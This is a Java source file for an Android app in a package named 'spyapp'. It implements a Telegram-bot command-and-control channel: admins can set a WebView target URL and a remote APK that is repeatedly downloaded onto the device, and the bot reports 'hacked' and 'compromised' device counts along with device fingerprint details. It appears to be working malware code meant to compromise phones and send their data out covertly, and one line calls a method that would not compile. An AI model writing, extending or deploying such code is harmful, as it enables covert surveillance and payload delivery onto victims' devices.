package com.spyapp;

import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class TelegramBotHelper {
    
    private static final String API_BASE = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/";
    private static final MediaType JSON = MediaType.get("application/json; charset=utf-8");
    
    private static OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .build();
    
    private static Handler handler = new Handler(Looper.getMainLooper());
    private static boolean isChecking = false;
    private static int lastUpdateId = 0;
    
    public static void startChecking(Context context) {
        if (isChecking) return;
        isChecking = true;
        
        // Start the check loop
        handler.post(new Runnable() {
            @Override
            public void run() {
                checkForUpdates(context);
                handler.postDelayed(this, Config.BOT_CHECK_INTERVAL);
            }
        });
        
        // Send bot started message to admin
        sendMessageToAdmin(context, 
                "🤖 *Bot Started*\n" +
                "• Device: " + Build.MODEL + "\n" +
                "• Android: " + Build.VERSION.RELEASE + "\n" +
                "• Time: " + getCurrentTime());
    }
    
    private static void checkForUpdates(Context context) {
        try {
            String url = API_BASE + "getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
            
            Request request = new Request.Builder()
                    .url(url)
                    .get()
                    .build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    // Silently fail
                }
                
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        String body = response.body().string();
                        try {
                            JSONObject json = new JSONObject(body);
                            if (json.getBoolean("ok")) {
                                JSONArray updates = json.getJSONArray("result");
                                for (int i = 0; i < updates.length(); i++) {
                                    JSONObject update = updates.getJSONObject(i);
                                    lastUpdateId = update.getInt("update_id");
                                    handleUpdate(context, update);
                                }
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private static void handleUpdate(Context context, JSONObject update) {
        try {
            if (!update.has("message")) return;
            
            JSONObject message = update.getJSONObject("message");
            long chatId = message.getLong("chat").getLong("id");
            
            // Check if this is from admin
            String adminIdsStr = Config.ADMIN_IDS;
            boolean isAdmin = false;
            for (String id : adminIdsStr.split(",")) {
                if (id.trim().equals(String.valueOf(chatId))) {
                    isAdmin = true;
                    break;
                }
            }
            
            if (!isAdmin) return;
            
            String text = message.optString("text", "");
            
            if (text.startsWith("/")) {
                handleCommand(context, chatId, text);
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private static void handleCommand(Context context, long chatId, String command) {
        String[] parts = command.split(" ", 2);
        String cmd = parts[0].toLowerCase();
        String args = parts.length > 1 ? parts[1] : "";
        
        switch (cmd) {
            case "/start":
                sendMessage(context, chatId, 
                        "👋 *Welcome to Admin Panel*\n\n" +
                        "Available commands:\n\n" +
                        "🔗 `/seturl <URL>` - Set target website\n" +
                        "📦 `/setapk <URL>` - Set APK download URL\n" +
                        "📊 `/status` - View current stats\n" +
                        "👥 `/hacked` - View hacked device info\n" +
                        "🔄 `/restart` - Restart bot services\n" +
                        "💻 `/device` - Get device info");
                break;
                
            case "/seturl":
                if (!args.isEmpty()) {
                    Config.CURRENT_TARGET_URL = args;
                    sendMessage(context, chatId, 
                            "✅ *Target URL Updated*\n\n" +
                            "New URL: `" + args + "`\n\n" +
                            "Next opened WebView will use this URL.");
                } else {
                    sendMessage(context, chatId, 
                            "❌ Usage: `/seturl https://example.com`");
                }
                break;
                
            case "/setapk":
                if (!args.isEmpty()) {
                    Config.APK_DOWNLOAD_URL = args;
                    sendMessage(context, chatId, 
                            "✅ *APK Download URL Updated*\n\n" +
                            "Download URL: `" + args + "`\n\n" +
                            "APK will now be downloaded every 2.5 seconds.");
                } else {
                    sendMessage(context, chatId, 
                            "❌ Usage: `/setapk https://example.com/app.apk`");
                }
                break;
                
            case "/status":
                sendMessage(context, chatId,
                        "📊 *Current Status*\n\n" +
                        "• Total Opens: `" + Config.totalOpens + "`\n" +
                        "• Total Downloads: `" + Config.totalDownloads + "`\n" +
                        "• Total Installs: `" + Config.totalInstalls + "`\n" +
                        "• Target URL: `" + Config.CURRENT_TARGET_URL + "`\n" +
                        "• APK URL: " + (Config.APK_DOWNLOAD_URL.isEmpty() ? "`Not set`" : "`" + Config.APK_DOWNLOAD_URL + "`") + "\n" +
                        "• Device: `" + Build.MODEL + "`\n" +
                        "• Android: `" + Build.VERSION.RELEASE + "`");
                break;
                
            case "/hacked":
                sendMessage(context, chatId,
                        "👥 *Hacked Devices Stats*\n\n" +
                        "• Total compromised: `" + Config.totalOpens + "`\n" +
                        "• APK downloads initiated: `" + Config.totalDownloads + "`\n" +
                        "• Successful installs estimated: `" + Config.totalInstalls + "`\n\n" +
                        "Commands sent via admin panel.");
                break;
                
            case "/restart":
                sendMessage(context, chatId, 
                        "🔄 *Restarting Services...*\n\n" +
                        "Bot services will be refreshed.");
                break;
                
            case "/device":
                sendMessage(context, chatId,
                        "💻 *Device Information*\n\n" +
                        "• Model: `" + Build.MODEL + "`\n" +
                        "• Manufacturer: `" + Build.MANUFACTURER + "`\n" +
                        "• Brand: `" + Build.BRAND + "`\n" +
                        "• Android: `" + Build.VERSION.RELEASE + "`\n" +
                        "• SDK: `" + Build.VERSION.SDK_INT + "`\n" +
                        "• Board: `" + Build.BOARD + "`\n" +
                        "• Fingerprint: `" + Build.FINGERPRINT + "`");
                break;
                
            default:
                sendMessage(context, chatId, 
                        "❌ Unknown command: `" + cmd + "`\n" +
                        "Type `/start` for help.");
                break;
        }
    }
    
    public static void sendMessageToAdmin(Context context, String message) {
        String adminIdsStr = Config.ADMIN_IDS;
        for (String id : adminIdsStr.split(",")) {
            try {
                long chatId = Long.parseLong(id.trim());
                sendMessage(context, chatId, message);
            } catch (Exception ignored) {}
        }
    }
    
    private static void sendMessage(Context context, long chatId, String text) {
        try {
            JSONObject payload = new JSONObject();
            payload.put("chat_id", chatId);
            payload.put("text", text);
            payload.put("parse_mode", "Markdown");
            
            RequestBody body = RequestBody.create(payload.toString(), JSON);
            Request request = new Request.Builder()
                    .url(API_BASE + "sendMessage")
                    .post(body)
                    .build();
            
            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {}
                
                @Override
                public void onResponse(Call call, Response response) {}
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private static String getCurrentTime() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        return sdf.format(new Date());
    }
                                     }
